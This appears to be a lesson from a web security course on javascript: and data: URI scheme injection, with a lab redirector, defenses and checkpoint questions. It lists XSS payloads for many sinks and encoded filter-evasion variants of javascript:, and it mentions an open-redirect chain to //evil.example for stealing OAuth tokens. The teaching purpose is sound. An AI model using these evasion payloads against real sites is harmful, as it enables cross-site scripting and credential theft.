Module 06 · Mechanism 3: URI schemes

URI Scheme Injection — javascript: and data: attack

Some sinks navigate to a URL. If you control the URL and the app trusts its scheme, you don't need angle brackets or event handlers — the scheme itself carries the code.

The two dangerous schemes

SchemeWhat it doesRuns in whose origin?
javascript:The URL body is executed as JS when the link/navigation activates.The current page's origin — full XSS.
data:text/html,…The URL is a document; the browser renders it.An opaque origin in modern top-level nav, but dangerous in <iframe>/<object> and older contexts; great for phishing and sandbox escapes.

The sinks that navigate

Any of these can carry a scheme-bearing URL:

<a href="javascript:alert(document.domain)">click me</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><button>go
<button formaction="javascript:alert(1)">
<svg><a xlink:href="javascript:alert(1)"><text>x</text></a>
<object data="javascript:alert(1)">
<iframe src="data:text/html,<script>alert(1)</script>">
// and from JS (this is also Module 09 territory):
location = 'javascript:alert(1)';        // ignored on assignment in modern browsers
window.open('javascript:alert(1)');
el.setAttribute('href','javascript:alert(1)');

Fire it against the lab redirector

Module 06 adds /go?url= (see vuln_redirect.py) — a classic "leaving the site" redirector that reflects url into a link href with no scheme check.

▶ open /go?url=javascript:…, then click the destination link → the alert fires in the lab origin.

Now the hardened version rejects the scheme: ▶ /go-safe?url=javascript:… — it falls back to /.

Why entity decoding makes this sneaky (link to Module 02)

The parser decodes character references in attribute values before your code sees them. So all of these reconstruct javascript: after parsing, defeating a naive filter that looks for the literal string:

java&#115;cript:alert(1)
java&#x73;cript:alert(1)
javascript&colon;alert(1)
&#106;avascript:alert(1)
  jav\tascript:alert(1)      <- leading/embedded whitespace & control chars
JaVaScRiPt:alert(1)          <- case

Consequence for defenders: a scheme check must run on the fully decoded, trimmed, lower-cased value — and even then it must be an allowlist (permit http/https/mailto/relative), never a denylist of "bad" schemes. Module 12 weaponizes these evasions; Module 17 builds the correct allowlist.

Open redirectors as XSS delivery

Even a redirector that does restrict schemes can be an attack amplifier. An open redirect (one that sends users to any attacker-chosen http(s) URL) is a delivery vehicle: it lends the target's trusted domain to a link that ultimately lands the victim on an attacker page, and it chains with other bugs (e.g. stealing an OAuth token by redirecting to //evil.example). The defensive lesson is the same: validate redirect targets against an allowlist, not just for scheme but for host.

The defense, precisely

  1. Decode fully (HTML entities + percent-encoding), trim whitespace/control chars, lower-case.
  2. Allowlist schemes: permit https:, http:, mailto:, and relative URLs (/, #, ?); reject everything else, including javascript:, data:, vbscript:, blob:.
  3. For redirects, also allowlist the host.
  4. Defense in depth: a CSP with a restrictive script-src blocks javascript: URL execution even if one slips through; navigate-to/form-action constrain navigation targets.

Checkpoint

  1. Why must a scheme check run on the decoded value, and give two encodings of javascript: that beat a literal-string filter.
  2. Why is an allowlist of schemes strictly safer than a denylist?
  3. How does an open redirect amplify an attack even when it only permits http/https?
